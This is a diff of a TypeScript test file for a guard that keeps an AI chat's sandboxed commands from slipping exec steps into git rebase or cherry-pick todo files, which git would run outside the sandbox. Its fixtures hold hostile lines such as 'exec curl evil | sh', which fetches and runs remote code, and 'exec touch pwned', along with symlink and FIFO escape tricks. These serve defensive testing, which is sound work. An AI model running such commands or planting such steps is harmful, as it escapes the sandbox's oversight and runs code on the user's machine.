@@ -538,6 +538,22 @@ describe("a look that could neither record nor tell its protected keys", () => {
 // git rebase --continue: the guest's rule lets commands write git's transient state.
 describe("a paused rebase's or cherry-pick's todo", () => {
   const output = async (guard: HookGuard) => ((await guard.after(ran(""))) as { ok: { output: string } }).ok.output;
+  // As the host wires it: a run is in flight from its refusal to the look after it, and live counts
+  // the chat's background processes.
+  function wired() {
+    const runs = new Set<string>();
+    const chat = { live: 0 };
+    const guard = new HookGuard(folder, { running: () => runs.size > 0, writing: () => chat.live > 0 });
+    // One run: its refusal, then what it does, then the look after it, whose notices it gives.
+    const run = async (does: () => unknown = () => {}) => {
+      runs.add("run");
+      await guard.refusal();
+      await does();
+      runs.delete("run");
+      return output(guard);
+    };
+    return { guard, run, chat };
+  }
 
   it("comments out exec lines a command added to a rebase todo, keeping the user's", async () => {
     // Baseline recorded at command start: one user exec line.
@@ -550,23 +566,28 @@ describe("a paused rebase's or cherry-pick's todo", () => {
     const notice = await output(guard);
     const after = readFileSync(todo, "utf8");
     expect(after).toContain("exec make test");                       // the user's line kept
-    expect(after).toContain("# Surogate removed a step a command added: exec curl evil | sh");
+    expect(after).toContain("# Surogate removed a step that appeared while the chat's commands could write: exec curl evil | sh");
     expect(after).not.toMatch(/^exec curl evil \| sh$/m);            // the added line neutralised
     expect(notice).toMatch(/removed a step/);
   });
 
-  it("keeps the exec lines of the user's own rebase -x, started on the host, that are there at the next command's start", async () => {
+  it("keeps the exec lines of the user's own rebase -x, paused on the host after the chat's commands while nothing of the chat's runs", async () => {
     mkdirSync(join(folder, ".git"));
-    const guard = new HookGuard(folder);
-    await guard.refusal();
-    expect(await output(guard)).toBe("");
+    const { guard, run } = wired();
+    expect(await run()).toBe("");
     const todo = join(folder, ".git/rebase-merge/git-rebase-todo");
     mkdirSync(dirname(todo));
-    writeFileSync(todo, "pick abc one\nexec make test\npick def two\nx make test\n");
-    await guard.refusal();
-    expect(await output(guard)).toBe("");
+    const own = "pick abc one\nexec make test\npick def two\nx make test\n";
+    writeFileSync(todo, own);
+    // The look every 5 s, then more commands, and a look while one is in flight.
     await guard.watch();
-    expect(readFileSync(todo, "utf8")).toBe("pick abc one\nexec make test\npick def two\nx make test\n");
+    expect(await run(() => guard.watch())).toBe("");
+    expect(await run()).toBe("");
+    await guard.watch();
+    expect(readFileSync(todo, "utf8")).toBe(own);
+    // A step a command adds is still the chat's.
+    expect(await run(() => writeFileSync(todo, `${own}exec touch pwned\n`))).toMatch(/removed a step/);
+    expect(readFileSync(todo, "utf8")).toBe(`${own}# Surogate removed a step that appeared while the chat's commands could write: exec touch pwned\n`);
   });
 
   it("comments out every exec line of a todo a command began, in a submodule's git folder too, and tells a look between commands with the next output", async () => {
@@ -578,21 +599,29 @@ describe("a paused rebase's or cherry-pick's todo", () => {
     const todo = join(lib, "sequencer/todo");
     writeFileSync(todo, "pick abc one\n\t x  touch pwned\r\nexecute\n");
     await guard.watch();
-    expect(readFileSync(todo, "utf8")).toBe("pick abc one\n# Surogate removed a step a command added: \t x  touch pwned\r\nexecute\n");
+    expect(readFileSync(todo, "utf8")).toBe("pick abc one\n# Surogate removed a step that appeared while the chat's commands could write: \t x  touch pwned\r\nexecute\n");
     expect(await output(guard)).toMatch(/removed a step.*\.git\/modules\/lib\/sequencer\/todo$/);
     expect(await output(guard)).toBe("");
   });
 
-  it("comments out a step added between commands while something of the chat's could have added it, though it is there at the next command's start", async () => {
+  it("comments out a step that appeared while a background process of the chat's lived, the user's own too, and keeps those that appear once none does", async () => {
     const todo = join(folder, ".git/rebase-merge/git-rebase-todo");
     mkdirSync(dirname(todo), { recursive: true });
     writeFileSync(todo, "exec make test\n");
-    const guard = new HookGuard(folder, { writing: () => true });
-    await guard.refusal();
-    writeFileSync(todo, "exec make test\nexec touch pwned\n");
-    await guard.refusal();
-    await guard.after(ran(""));
-    expect(readFileSync(todo, "utf8")).toBe("exec make test\n# Surogate removed a step a command added: exec touch pwned\n");
+    const { guard, run, chat } = wired();
+    expect(await run(() => {
+      chat.live = 1;
+    })).toBe("");
+    writeFileSync(todo, "exec make test\nexec npm test\n");
+    // Present at the next command's start, still not known to be the user's.
+    expect(await run()).toMatch(/removed a step/);
+    expect(readFileSync(todo, "utf8")).toBe("exec make test\n# Surogate removed a step that appeared while the chat's commands could write: exec npm test\n");
+    chat.live = 0;
+    await guard.watch();
+    writeFileSync(todo, "exec make test\nexec npm run lint\n");
+    await guard.watch();
+    expect(await run()).toBe("");
+    expect(readFileSync(todo, "utf8")).toBe("exec make test\nexec npm run lint\n");
   });
 
   it("leaves the todos alone while a command runs, whose rebase may be working through one, and comments out what it added once none does", async () => {
@@ -608,7 +637,7 @@ describe("a paused rebase's or cherry-pick's todo", () => {
     expect(readFileSync(todo, "utf8")).toBe("pick abc one\nexec make test\n");
     running = false;
     expect(await output(guard)).toMatch(/removed a step.*\.git\/rebase-merge\/git-rebase-todo$/);
-    expect(readFileSync(todo, "utf8")).toBe("pick abc one\n# Surogate removed a step a command added: exec make test\n");
+    expect(readFileSync(todo, "utf8")).toBe("pick abc one\n# Surogate removed a step that appeared while the chat's commands could write: exec make test\n");
   });
 
   it("after a crash, comments out every exec line before any command", async () => {
@@ -616,7 +645,7 @@ describe("a paused rebase's or cherry-pick's todo", () => {
     mkdirSync(dirname(todo), { recursive: true });
     writeFileSync(todo, "exec touch pwned\n");
     expect(await new HookGuard(folder, { inherited: new Map() }).refusal()).toBeNull();
-    expect(readFileSync(todo, "utf8")).toBe("# Surogate removed a step a command added: exec touch pwned\n");
+    expect(readFileSync(todo, "utf8")).toBe("# Surogate removed a step that appeared while the chat's commands could write: exec touch pwned\n");
   });
 
   it("replaces a todo linked to a file in the folder as a file, leaving the file, and refuses commands while one it cannot change or read is there", async () => {
@@ -627,15 +656,16 @@ describe("a paused rebase's or cherry-pick's todo", () => {
     writeFileSync(join(folder, "notes.txt"), "exec touch pwned\n");
     symlinkSync("../../notes.txt", join(merge, "git-rebase-todo"));
     await guard.after(ran(""));
-    expect(readFileSync(join(merge, "git-rebase-todo"), "utf8")).toBe("# Surogate removed a step a command added: exec touch pwned\n");
+    expect(readFileSync(join(merge, "git-rebase-todo"), "utf8")).toBe("# Surogate removed a step that appeared while the chat's commands could write: exec touch pwned\n");
     expect(readFileSync(join(folder, "notes.txt"), "utf8")).toBe("exec touch pwned\n");
     // Its folder leads out of the folder, where the guard writes nothing.
+    await guard.refusal();
     rmSync(merge, { recursive: true });
     mkdirSync(join(other, "merge"));
     writeFileSync(join(other, "merge", "git-rebase-todo"), "exec touch pwned\n");
     symlinkSync(join(other, "merge"), merge);
     await guard.after(ran(""));
-    expect(await guard.refusal()).toEqual({ error: { type: "sandbox", message: "Blocked: the computer could not remove the steps a command added to .git/rebase-merge/git-rebase-todo, which git would run outside the sandbox. Abort that rebase or cherry-pick, or remove those exec lines, to run commands here." } });
+    expect(await guard.refusal()).toEqual({ error: { type: "sandbox", message: "Blocked: the computer could not remove the steps that appeared in .git/rebase-merge/git-rebase-todo while this chat's commands could write there, which git would run outside the sandbox. Abort that rebase or cherry-pick, or remove those exec lines, to run commands here." } });
     expect(readFileSync(join(other, "merge", "git-rebase-todo"), "utf8")).toBe("exec touch pwned\n");
     // A FIFO git would wait on, which a process could feed.
     rmSync(merge);
